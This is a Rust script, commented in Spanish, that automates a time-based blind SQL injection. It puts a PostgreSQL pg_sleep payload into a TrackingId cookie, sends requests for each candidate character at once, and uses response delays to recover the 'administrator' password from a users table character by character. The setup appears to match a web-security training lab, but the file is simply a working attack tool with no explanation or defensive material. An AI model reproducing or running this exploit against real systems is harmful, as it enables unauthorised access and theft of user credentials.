use reqwest::Client;
use std::time::Instant;
use urlencoding::encode;
use futures::future::join_all;
use std::io::{stdout, Write};
use std::env;
use colored::*;

fn get_colored_position(pos: usize) -> ColoredString {
    let colors = [
        "cyan",
        "green",
        "yellow",
        "blue",
        "magenta",
        "bright_blue",
        "bright_yellow",
    ];

    let color = colors[pos % colors.len()];

    match color {
        "cyan" => format!("\r[{:>2}]", pos).cyan().bold(),
        "green" => format!("\r[{:>2}]", pos).green().bold(),
        "yellow" => format!("\r[{:>2}]", pos).yellow().bold(),
        "blue" => format!("\r[{:>2}]", pos).blue().bold(),
        "magenta" => format!("\r[{:>2}]", pos).magenta().bold(),
        "bright_blue" => format!("\r[{:>2}]", pos).bright_blue().bold(),
        "bright_yellow" => format!("\r[{:>2}]", pos).bright_yellow().bold(),
        _ => format!("\r[{:>2}]", pos).white().bold(),
    }
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Uso: {} <URL> <SESSION_COOKIE>", args[0]);
        std::process::exit(1);
    }

    let client = Client::new();

    let url = args[1].clone();
    let session_cookie = args[2].clone();

    let charset = "abcdefghijklmnopqrstuvwxyz0123456789";
    let mut password = String::new();

    println!("{} {} {}", "\n[*]".yellow().bold(), "Iniciando ataque Time-based Blind SQLI".red().bold(), "...\n".white());

    for position in 1..=20 {
        //println!("\n[*] Probando posición {}", position);
        //creo un vector para futures, uno por cada caracter
        let mut futures = vec![];

        for c in charset.chars() {
            let client = client.clone();
            let url = url.to_string();
            let cookie = session_cookie.to_string();
            let payload = format!(
               "test'; SELECT CASE WHEN (username='administrator' AND substring(password, {}, 1)='{}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users-- -",
                position, c
            );
            let cookie_header = format!("TrackingId={}; session={}", encode(&payload), cookie);
            let fut = async move {
                let start = Instant::now();
                let res = client.get(&url).header("Cookie", cookie_header).send().await;

                let elapsed = start.elapsed().as_secs_f64();
                (c, elapsed, res.is_ok())
            };
            futures.push(fut);
        }
        let results = join_all(futures).await;

        let mut found = false;
        for (c, elapsed, success) in results {
            if success && elapsed > 2.0 {
                 password.push(c);
                 print!(
                    "{} {} {} {} {}", get_colored_position(position), "Buscando:".white(), format!("'{}'", c).yellow(), "| Password:".white(), format!("{}", password).magenta()
                );
                stdout().flush().unwrap();
                found = true;
                break;

             }
        }
        if !found {
            print!("\r[{:>2}] No se encontró carácter para posición \n", position);
            break;
        }
   }
    print!("{} {} {}", "\n[✓]".green(), "Contraseña encontrada:".white(), format!("{}\n", password).green());
    Ok(())
}


